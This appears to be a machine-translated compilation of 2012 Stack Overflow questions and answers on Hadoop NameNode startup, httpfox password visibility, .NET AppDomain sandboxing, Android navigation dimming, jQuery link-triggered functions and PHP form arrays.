我最近建立了一个由两台*CentOS* 6 机器组成的简单集群，并在其上安装了*hadoop-0.23.4*文件系统。格式化完成，没有错误消息，我可以启动 DataNodes（在我拥有的 1 个从机上）、ResourceManager（在主控机上）和 NodeManagers（再次在每 (1) 个从属机上）。

我无法弄清楚为什么 NameNode 没有启动。发出命令后：

```
sbin/hadoop-daemon.sh start namenode 
```

在主人身上，我得到了这个输出

```
starting namenode, logging to /home/cira/hadoop/hadoop-0.23.4/logs/hadoop-cira-namenode-op03.out
2012-11-07 17:28:59,596 INFO  namenode.NameNode (StringUtils.java:startupShutdownMessage(597)) - STARTUP_MSG: 
/************************************************************
STARTUP_MSG: Starting NameNode
STARTUP_MSG:   host = op03/192.168.100.223
STARTUP_MSG:   args = []
STARTUP_MSG:   version = 0.23.4
STARTUP_MSG:   classpath = /home/cira/hadoop/hadoop-0.23.4/conf:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jackson-jaxrs-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/guava-11.0.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jsp-api-2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-el-1.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jaxb-impl-2.2.3-1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jaxb-api-2.2.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jackson-core-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/protobuf-java-2.4.0a.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jsr305-1.3.9.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-math-2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/hadoop-auth-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/activation-1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/log4j-1.2.15.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/xmlenc-0.52.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/core-3.1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jersey-json-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jetty-6.1.26.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-beanutils-core-1.8.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/velocity-1.7.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/paranamer-2.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/avro-1.5.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/stax-api-1.0.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-collections-3.2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-httpclient-3.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jersey-server-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-codec-1.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jasper-compiler-5.5.23.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-cli-1.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/slf4j-api-1.6.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-lang-2.5.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jets3t-0.6.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/aspectjrt-1.6.5.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/snappy-java-1.0.3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-io-2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/hadoop-annotations-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/json-simple-1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-beanutils-1.7.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/netty-3.2.4.Final.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/kfs-0.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/asm-3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jasper-runtime-5.5.23.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-logging-api-1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/slf4j-log4j12-1.6.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jackson-mapper-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-configuration-1.6.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jersey-core-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jackson-xc-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/avro-ipc-1.5.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/oro-2.0.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/servlet-api-2.5.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-digester-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jettison-1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-logging-1.1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/jetty-util-6.1.26.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/lib/commons-net-1.4.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/hadoop-common-0.23.4-test-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/hadoop-common-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/hadoop-common-0.23.4-tests.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/common/hadoop-common-0.23.4-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/jackson-core-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/protobuf-java-2.4.0a.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/log4j-1.2.15.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/paranamer-2.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/avro-1.5.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/slf4j-api-1.6.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/snappy-java-1.0.3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/jackson-mapper-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/commons-logging-1.1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/lib/commons-daemon-1.0.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/hadoop-hdfs-0.23.4-test-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/hadoop-hdfs-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/hadoop-hdfs-0.23.4-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/hdfs/hadoop-hdfs-0.23.4-tests.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/javax.inject-1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jdiff-1.0.9.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jackson-core-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/protobuf-java-2.4.0a.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/guice-3.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/log4j-1.2.15.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/paranamer-2.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/avro-1.5.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jersey-server-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/snappy-java-1.0.3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/commons-io-2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/hadoop-annotations-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/netty-3.2.4.Final.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/asm-3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/aopalliance-1.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jackson-mapper-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jersey-core-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/jersey-guice-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/junit-4.8.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/lib/guice-servlet-3.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-applications-distributedshell-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-web-proxy-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-api-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-resourcemanager-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-nodemanager-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-tests-0.23.4-tests.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-site-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-common-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-common-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/yarn/hadoop-yarn-server-tests-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/javax.inject-1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jdiff-1.0.9.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/clover-3.0.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jackson-core-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/protobuf-java-2.4.0a.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/guice-3.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/log4j-1.2.15.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/paranamer-2.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/avro-1.5.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jersey-server-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/snappy-java-1.0.3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/commons-io-2.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/hadoop-annotations-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/netty-3.2.4.Final.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/asm-3.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/hsqldb-2.0.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/aopalliance-1.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jackson-mapper-asl-1.8.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jersey-core-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/jersey-guice-1.8.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/junit-4.8.2.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/commons-logging-1.1.1.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/commons-daemon-1.0.3.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/lib/guice-servlet-3.0.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-common-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-0.23.4-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-0.23.4-gridmix.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-0.23.4-tests.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-test-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-core-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-test-0.23.4-sources.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-hs-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-app-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-examples-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-shuffle-0.23.4.jar:/home/cira/hadoop/hadoop-0.23.4/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-0.23.4.jar
STARTUP_MSG:   build = https://svn.apache.org/repos/asf/hadoop/common/branches/branch-0.23.4/hadoop-common-project/hadoop-common -r 1392631; compiled by 'evans' on Mon Oct 22 13:02:13 CDT 2012
************************************************************/
[cira@op03 hadoop-0.23.4]$ 
```

并且没有错误消息（或者至少没有我发现的错误消息）。日志也不包含错误。

在主 jps 返回

```
2234 Jps
1989 ResourceManager 
```

在我得到奴隶的时候

```
2234 Jps
2023 NodeManager
1856 DataNode 
```

关于我应该在哪里调查的任何线索？谢谢

# security - 为什么 httpfox 可以在 HTTPS 中捕获 google 帐户清除密码？

> ID：13280249
> 
> 赞同：1
> 
> 时间：2012-11-07T23:45:28.753
> 
> 标签：security, https, passwords, fiddler, httpfox

我已经在 Firefox 上安装了[httpfox](https://addons.mozilla.org/en-US/firefox/addon/httpfox/?src=search)。我试图在 Google 帐户登录页面上捕获流量，我为我的测试输入了错误的密码，令我惊讶的是，它在 https 页面中捕获了明确的密码。

但我在 Firefox/IE 上尝试了[提琴手](http://www.fiddler2.com/fiddler2/)，没有捕获到明确的数据。

我听说 HTTPS 标头也是加密的。但是为什么他们仍然在 httpfox 中被捕获？黑客可以通过网络做同样的事情吗？

![在此处输入图像描述](../Images/5014d0693286b94962d98a3034cf2715.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T23:49:27.660

这实际上取决于您在哪里探查这些值或数据。

我从未使用过这两种工具，但据我了解，我假设以下内容：

*   **httpfox**是一个浏览器插件。**因此，它只是在加密和发送之前**以及在接收和解密之后捕获流量数据（即发送的内容） 。
*   **相比之下，提琴手**是一个外部代理，因此不会看到任何未加密的内容，因为它只监视通过的流量。

总体而言，httpfox 将向您展示浏览器对您的连接的了解。fiddler 将向您展示连接服务器途中的任何服务器/代理将看到什么（垃圾）。

这也是您应该只安装和使用您信任的插件的原因。您可以拥有完美的网络安全性，始终使用 https/SSL 等，但如果您的插件之一正在窃取美味的部分，它对您无济于事。

# .net - 沙盒 AppDomain 的 ApplicationBase 是否应该不同？

> ID：13280251
> 
> 赞同：2
> 
> 时间：2012-11-07T23:45:41.113
> 
> 标签：.net, f#, clr, sandbox, appdomain

将从属沙箱域的 ApplicationBase 设置为与托管域相同的路径的确切安全含义是什么？

我发现 MSDN 指南指出，从域的 ApplicationBase 应该不同“如果 ApplicationBase 设置相同，则部分信任应用程序可以让托管应用程序加载（完全信任）它定义的异常，从而利用它” （第 3 页）：

[http://msdn.microsoft.com/en-us/library/bb763046.aspx](http://msdn.microsoft.com/en-us/library/bb763046.aspx)

这个漏洞究竟是如何工作的？

在我的场景中，我愿意完全信任地运行位于 ApplicationBase 下的所有程序集。我专门对从属 AppDomain 进行沙盒处理，以限制该域内动态生成的程序集的权限。我尝试遵循指南，但由于程序集加载到 LoadFrom 上下文中，更改 ApplicationBase 属性似乎破坏了我在域之间拥有的双向通信桥，所以我想避免它。

示例 F# 代码演示了具有不同 ApplicationBase 值的问题：

```
module Main =

    open System
    open System.Diagnostics
    open System.IO
    open System.Reflection
    open System.Security
    open System.Security.Permissions
    open System.Security.Policy

    /// Change this switch to observe the problem.
    let useSameApplicationBase = true

    let getStrongName (a: Assembly) =
        match a.Evidence.GetHostEvidence<StrongName>() with
        | null -> None
        | sn -> Some sn

    let getAssemblies () =
        [|
            Assembly.GetExecutingAssembly()
        |]

    let buildAppDomain () =
        let fullTrust =
            getAssemblies ()
            |> Array.choose getStrongName
        let evidence = null
        let appBase =
            if useSameApplicationBase then
                AppDomain.CurrentDomain.BaseDirectory
            else
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Untrusted")
        let setup = AppDomainSetup(ApplicationBase = appBase)
        let perms = PermissionSet(PermissionState.None)
        AppDomain.CreateDomain("SLAVE", null, setup, perms, fullTrust)

    [<Sealed>]
    type Backer() =
        inherit MarshalByRefObject()
        member this.Pong() =
            Console.WriteLine("PONG IN DOMAIN = {0}", AppDomain.CurrentDomain.FriendlyName)

    [<Sealed>]
    type Sandbox() =
        inherit MarshalByRefObject()
        member this.Start(backer: obj) =
            Console.WriteLine("RUN IN SLAVE DOMAIN = {0}", AppDomain.CurrentDomain.FriendlyName)
            (backer :?> Backer).Pong()

    let test () =
        let dom = buildAppDomain ()
        try
            let handle =
                Activator.CreateInstanceFrom(dom,
                    typeof<Sandbox>.Assembly.Location,
                    typeof<Sandbox>.FullName)
            let sandbox = handle.Unwrap() :?> Sandbox
            sandbox.Start(Backer())
        finally
            AppDomain.Unload(dom)

    test () 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T06:50:28.127

```
module Main =

    open System
    open System.Diagnostics
    open System.IO
    open System.Reflection
    open System.Security
    open System.Security.Permissions
    open System.Security.Policy

    /// Change this switch to observe the problem.
    let useSameApplicationBase = false

    let getStrongName (a: Assembly) =
        match a.Evidence.GetHostEvidence<StrongName>() with
        | null -> None
        | sn -> Some sn

    let getAssemblies () =
        [|
            Assembly.GetExecutingAssembly()
        |]

    let buildAppDomain () =
        let fullTrust =
            getAssemblies ()
            |> Array.choose getStrongName
        let evidence = null
        let appBase =
            if useSameApplicationBase then
                AppDomain.CurrentDomain.BaseDirectory
            else
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Untrusted")
        let setup = AppDomainSetup(ApplicationBase = appBase)
        let perms = PermissionSet(PermissionState.None)
        AppDomain.CreateDomain("SLAVE", null, setup, perms, fullTrust)

    module AssemblyResolveSetup = 
        let install() = 
            let resolveHandler = 
                    ResolveEventHandler(
                        fun _ args ->
                            // try to find requested assembly in current domain
                            let name = AssemblyName(args.Name)
                            let asmOpt =
                                AppDomain.CurrentDomain.GetAssemblies()
                                |> Array.tryFind(fun asm -> AssemblyName.ReferenceMatchesDefinition(AssemblyName(asm.FullName), name))
                            defaultArg asmOpt null
                    )        
            AppDomain.CurrentDomain.add_AssemblyResolve(resolveHandler)

    [<Sealed>]
    type Backer() =
        inherit MarshalByRefObject()
        member this.Pong() =
            Console.WriteLine("PONG IN DOMAIN = {0}", AppDomain.CurrentDomain.FriendlyName)

    [<Sealed>]
    type Sandbox() =
        inherit MarshalByRefObject()
        do AssemblyResolveSetup.install()
        member this.Start(backer: obj) =
            Console.WriteLine("RUN IN SLAVE DOMAIN = {0}", AppDomain.CurrentDomain.FriendlyName)
            (backer :?> Backer).Pong()

    let test () =
        let dom = buildAppDomain ()
        try
            let handle =
                Activator.CreateInstanceFrom(dom,
                    typeof<Sandbox>.Assembly.Location,
                    typeof<Sandbox>.FullName)
            let sandbox = handle.Unwrap() :?> Sandbox
            sandbox.Start(Backer())
        finally
            AppDomain.Unload(dom)

    test () 
```

**更新（假设测试代码包含在程序集 Sandbox.exe 中）**

**Q** : resolution 如何通过查看 SLAVE (CurrentDomain) 找到 SLAVE 中的程序集，听起来像一个恶性循环

SLAVE 域已经包含 Sandbox.exe，但它是在 LoadFrom 上下文中加载的，因此在解析加载上下文的依赖项时不会自动探测它（[选择绑定上下文](http://blogs.msdn.com/b/suzcook/archive/2003/05/29/57143.aspx)）。

**问**：为什么它会中断 asm.GetName() 而不是 AssemblyName(asm.FullName)

Assembly.GetName 需要 FileIOPermission、Assembly.FullName - 我认为如果您更换，请不要这样

```
AssemblyName(asm.FullName) 
```

和

```
let name = AssemblyName(args.Name)
let p = new FileIOPermission(PermissionState.Unrestricted)
p.Assert()
try
    let asmOpt =
        AppDomain.CurrentDomain.GetAssemblies()
        |> Array.tryFind(fun asm -> AssemblyName.ReferenceMatchesDefinition(asm.GetName(), name))
    defaultArg asmOpt null
finally
    CodeAccessPermission.RevertAssert() 
```

这也应该有效（没试过）

**问**：为什么它会因为静态而刹车？AssemblyResolveSetup.install()

这是这里唯一的 F# 特定问题。我猜您的测试项目是编译为 exe 的单文件项目。根据 F# 规范：

*对于具有隐式入口点的可执行文件，出现在命令行上的最后一个文件的静态初始化程序是隐式入口点函数的主体。*

So code in 'static do' block will be placed before the call to 'test()' in the implicit entry point instead of being compiled to the body of static constructor. Fix - either put Test module to the separate non-last file or move it to the library

# android - Android：调暗导航按钮

> ID：13280253
> 
> 赞同：2
> 
> 时间：2012-11-07T23:45:55.963
> 
> 标签：android, button, navigationbar

我正在尝试调暗 Honeycomb+ 上的导航按钮（返回、主页等）。看起来这应该可以解决问题，但它对我不起作用：

```
protected void onResume( )
{
    super.onResume();

    View v = findViewById( android.R.id.content );
    if ( v != null )
        v.setSystemUiVisibility( isNightVision() ? View.SYSTEM_UI_FLAG_LOW_PROFILE
                                                  :View.SYSTEM_UI_FLAG_VISIBLE );
} 
```

我有一些证据表明我这样做是正确的，因为如果我使用 SYSTEM_UI_FLAG_HIDE_NAVIGATION 而不是 SYSTEM_UI_FLAG_LOW_PROFILE，导航栏会隐藏。

我正在 Nexus 7 上进行测试，起初我虽然可能该设备不支持此选项。但是，使用 Kindle 应用程序时，按钮会变暗为点，所以我认为这是可能的。有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:59:54.183

这是我在我的一个应用程序中所做的：

```
getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T17:55:33.723

好的，我想我想通了。我们的应用程序有点复杂，因为它有一个 Java 库（我试图将按钮变暗）、一个本机 C 库和几个使用这些库的 shell 应用程序。

看起来我需要放置：

```
<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="11" /> 
```

在库清单以及外壳清单中。

我还需要在库和 shell 的属性中将目标 SDK 设置为 11。

我想以前我只在库中完成了这项工作，但是需要将它放在 shell 中才能使该功能真正起作用。

# javascript - 当且仅当通过特定超链接访问页面时，如何在页面加载时执行 jQuery 函数？

> ID：13280261
> 
> 赞同：0
> 
> 时间：2012-11-07T23:46:33.487
> 
> 标签：javascript, jquery

我有一个简单的链接，如下所示：

```
<a href="page2.html">Go to Page 2</a> 
```

我希望，当单击此按钮时，它会转到页面并运行一个 jQuery 函数，如下所示：

```
$("#object-selector div").hover(
    function () {
        $(this).animate({borderTopColor: '#fdcc06', borderRightColor: '#fdcc06', borderBottomColor: '#fdcc06', borderLeftColor: '#fdcc06'}, 200).children().animate({backgroundColor: '#fed944', color: '#351e00'}, 200);
    }, 
    function () {
        $(this).animate({borderTopColor: '#FFF', borderRightColor: '#FFF', borderBottomColor: '#FFF', borderLeftColor: '#FFF'}, 200).children().animate({backgroundColor: '#af081f', color: '#FFF'}, 200);
    }
); 
```

*但是，如果在没有*单击链接的情况下导航到页面，则不应执行该功能。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:50:40.430

如果你想在客户端做这一切，你可以在你的 URL 上附加一个哈希

```
<a href="page2.html#hover">Go to Page 2</a> 
```

然后使用下面的代码

```
<script>
if(window.location.hash === '#hover') {
    $(function() {
        $("#object-selector div").hover( ... , ... );
    });
}
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:55:17.737

也许有一种方法可以用 PHP 实现这一点。通过将您的 href 更改为此

```
<a href="page2.html?click=1">Go to Page 2</a> 
```

然后在您的页面上包含以下内容：

```
<?php
if ($_GET['click']){

echo "<script type=\"text/javascript\">";
echo "
$(\"#object-selector div\").hover(
    function () {
        $(this).animate({borderTopColor: '#fdcc06', borderRightColor: '#fdcc06', borderBottomColor: '#fdcc06', borderLeftColor: '#fdcc06'}, 200).children().animate({backgroundColor: '#fed944', color: '#351e00'}, 200);
    }, 
    function () {
        $(this).animate({borderTopColor: '#FFF', borderRightColor: '#FFF', borderBottomColor: '#FFF', borderLeftColor: '#FFF'}, 200).children().animate({backgroundColor: '#af081f', color: '#FFF'}, 200);
    }
);
";
echo "</script>";
}
?> 
```

请注意，这仅适用于安装了 PHP 的服务器，而不适用于您的本地计算机。

# php - 如何在 PHP 中通过 html 表单向数组添加多个新值？

> ID：13280262
> 
> 赞同：1
> 
> 时间：2012-11-07T23:46:44.230
> 
> 标签：php

我想通过 html 形式在 php 数组中添加新值。我在php中写了如下内容：

```
$b=array();
$b[]=$_POST['unos']; 
```

在html中是这样的：

```
<form action="?" method="post">
<input type="number" name="unos"  id="unos">
</form> 
```

该代码完成了这项工作，但仅用于一个值。换句话说，我在问如何在数组中导入多个值。我在 html 输入表单中添加了 value="3"
，但这当然不起作用，或者它只是答案的一部分。如何告诉 php 允许通过 html 表单在数组中添加多个值？

更新：

我想在一个输入字段中导入更多值，例如用“，”或任何约定分隔。

更新：

```
 <?php
 $unos=array();
 $unos[]=$_POST['unos'];
 $rezultat=count($unos); /*number of n's*/
 $zbir=array_sum($unos); /*total sum of n's*/
 $av=$zbir/$rezultat;    /*average value of n's*/
 echo "average value is $av</br>";
 }
 ?>
 <form action="?" method="post">
 <input type="number" name="unos"  id="unos">
 <input type="submit" value="Submit">
 </form> 
```

该代码计算n的平均值。我是初学者，只想知道如何通过 html 由用户添加数组的值。我想知道如何在 1 个输入文件中做到这一点的原因是因为我不想用输入字段的数量来限制值的数量. 我想让该用户可以根据需要添加任意数量的值。对不起，我的英语不完美。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:51:46.497

我对你的要求有点困惑，但我假设你想制作`unos`一个数组。你可以这样做：

```
<input type="number" name="unos[]"  id="unos0">
<input type="number" name="unos[]"  id="unos1">
<input type="number" name="unos[]"  id="unos2">
<input type="number" name="unos[]"  id="unos3">
<input type="number" name="unos[]"  id="unos4"> 
```

然后为了通过 PHP 访问它们，只需使用`$_POST['unos'][$n]`$n 是一个整数。你也可以循环`$_POST['unos']`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:52:01.583

使用类似的东西：

```
<form ...>
  <input type="text" name="unos[]" value="1" />
  <input type="text" name="unos[]" value="2" />
</form> 
```

方括号告诉 PHP 将值存储到数组中：

```
echo $_POST['unos'][0]; // "1"
echo $_POST['unos'][1]; // "2" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T23:52:28.027

您可以有多个表单输入，并给它们一个数组样式的名称：

```
<form action="whatever.php" method="post">
    <input type="number" name="unos[]"/>
    <input type="number" name="unos[]"/>
    <input type="number" name="unos[]"/>
</form> 
```

然后在 PHP 中你可以访问数组：

```
foreach($_POST['unos'] as $unos) {
    ...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T23:51:07.527

```
<input type="number" name="unos[]">
<input type="number" name="unos[]">
<input type="number" name="unos[]">
etc. 
```

